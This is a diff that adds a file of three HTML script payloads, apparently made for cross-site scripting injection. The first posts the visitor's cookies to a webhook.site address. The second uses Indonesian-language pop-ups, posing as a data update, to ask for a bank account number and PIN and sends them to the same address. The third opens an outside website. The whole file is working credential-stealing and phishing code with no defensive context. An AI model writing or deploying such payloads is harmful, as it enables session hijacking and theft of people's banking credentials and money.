@@ -1,0 +1,23 @@
+<script>
+  fetch("https://webhook.site/aaeddcb5-ce9d-4167-ba26-0c1a20a5ec4c", {
+    method: "POST",
+    mode: "no-cors",
+    body: document.cookie
+  });
+</script>
+
+<script>
+  alert("Hai, kami ada pembaharuan data, tolong masukkan data-data yang kami minta untuk memastikan data anda benar dan aman.");
+  let noRekening = prompt("Masukkan no rekening anda:");
+  let pin = prompt("Masukkan PIN nya:");
+  fetch("https://webhook.site/aaeddcb5-ce9d-4167-ba26-0c1a20a5ec4c", {
+    method: "POST",
+    mode: "no-cors",
+    body: `{"no_rekening": ${noRekening}, "pin": ${pin}}`
+  });
+  alert("Terima kasih untuk waktunya, selamat beraktivitas kembali...");
+</script>
+
+<script>
+  window.open("https://alwaysngoding.com", "_blank");
+</script>
